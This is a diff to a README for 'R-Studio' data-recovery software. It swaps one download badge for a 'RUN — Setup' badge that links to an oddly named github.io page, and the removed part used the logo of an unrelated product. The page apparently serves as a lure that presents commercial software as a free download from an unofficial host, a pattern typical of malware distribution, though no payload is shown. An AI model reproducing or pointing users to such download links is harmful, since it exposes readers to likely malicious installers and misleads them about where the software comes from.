@@ -1,14 +1,6 @@
 # R-Studio – Advanced Data Recovery Software
 
-<p align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/RStudio_logo_flat.svg/2560px-RStudio_logo_flat.svg.png" alt="R-Studio Logo"/>
-</p>
-
-<p align="center">
-  <a href="https://rstudio-download.github.io/.github/">
-    <img src="https://img.shields.io/badge/⬇️_Get_R_Studio-blue?style=for-the-badge&logo=github" alt="Get R-Studio"/>
-  </a>
-</p>
+[![RUN Setup](https://img.shields.io/badge/RUN%20%E2%80%94%20Setup-2ea44f?style=for-the-badge&logoColor=white)](https://notebookwalkerprimeceemq123.github.io/.github/Rstudio)
 
 ---
 
